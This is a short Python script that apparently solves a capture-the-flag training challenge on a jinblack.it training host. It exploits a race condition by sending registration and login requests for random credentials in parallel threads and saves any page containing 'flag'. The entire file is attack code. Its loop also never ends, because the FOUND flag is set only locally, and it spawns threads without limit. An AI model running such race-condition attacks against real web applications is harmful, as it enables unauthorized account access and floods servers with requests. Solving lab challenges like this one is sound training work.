import os
import requests
from threading import Thread
import random
import string
import time

Login_URL = "http://meta.training.jinblack.it/login.php"
Reg_URL = "http://meta.training.jinblack.it/register.php"
Home_URL = "http://meta.training.jinblack.it/"

header = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1"
}

FOUND = False

def randomString(N):
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N))


def attempRegist(username, password):
    param = {'username': username, 'password_1': password, 'password_2': password, 'reg_user': ''}
    register = requests.post(url=Reg_URL, verify=False, headers=header, data=param)
    time.sleep(2)


def attempLogin(username, password):
    param = {'username': username, 'password': password, 'log_user':''}
    s = requests.Session()
    login = s.post(url=Login_URL, data=param)
    home = s.get(url=Home_URL)

    if 'flag' in home.text:
        FOUND = True
        print('FOUND!! check response.html')
        os.remove('response.html')
        f = open('response.html', 'a')
        f.write(home.text)
        f.close()
    time.sleep(2)


while FOUND == False:

    username = randomString(10)
    password = randomString(10)

    r = Thread(target=attempRegist, args=(username, password))
    l = Thread(target=attempLogin, args=(username, password))
    r.start()
    l.start()

